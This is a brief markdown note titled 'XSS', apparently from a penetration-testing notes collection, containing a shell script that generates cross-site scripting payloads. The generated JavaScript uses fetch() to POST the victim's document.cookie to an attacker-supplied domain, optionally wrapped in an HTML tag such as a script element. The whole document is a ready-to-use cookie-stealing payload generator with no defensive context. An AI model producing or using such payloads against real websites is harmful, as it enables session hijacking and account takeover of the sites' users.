# XSS

Script for generating fetch commands

```bash
#!/bin/sh

if [ $# -lt 1 ];
then
        echo "$0 target_domain html_tag";

elif [ $# -eq 1 ];
then
        target_domain=$1

cat << EOF
fetch('//$target_domain',
        {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
});
EOF

else
        target_domain=$1
        tag=$2

cat << EOF
<$tag>
fetch('//$target_domain',
        {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
});
</$tag>
EOF
fi


```
